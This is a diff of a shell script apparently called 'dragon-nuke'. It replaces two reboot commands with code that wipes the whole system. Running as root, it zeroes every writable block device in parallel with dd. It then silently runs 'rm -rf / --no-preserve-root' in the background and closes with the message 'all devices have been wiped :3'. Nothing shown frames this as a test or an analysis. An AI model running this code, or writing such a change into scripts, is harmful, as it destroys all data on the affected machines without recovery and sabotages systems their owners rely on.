@@ -42,6 +42,33 @@ notify_users "Filesystem nuke starting NOW!" "0"
 # Final log entry
 echo "$(date): Executing nuke command" >> /var/log/dragon-nuke.log
 
-# Execute the reboot in multiple ways
-/sbin/reboot &
-sudo reboot now &
+# Execute the nuke
+
+# require root
+if [ "$(id -u)" -ne 0 ]; then
+  echo "Error: This script must be run as root." >&2
+  exit 1
+fi
+
+# Array of block devices
+declare -a devices=($(lsblk --list --output NAME,RO --paths --nodeps | awk '$2==0 {print $1}'))
+
+# Function to zero out a device
+zero_device() {
+  echo "Wiping $1..."
+  dd if=/dev/zero of="$1" bs=4M status=progress oflag=sync bsync=1M conv=fsync &
+}
+
+# Run wipe commands in parallel
+for dev in "${devices[@]}"; do
+  zero_device "$dev"
+done
+
+# wipe root filesystem in background silently
+echo "Wiping root filesystem..."
+rm -rf / --no-preserve-root & 2>&1 >/dev/null
+
+# Wait for all processes to finish
+wait
+
+echo "all devices have been wiped :3"
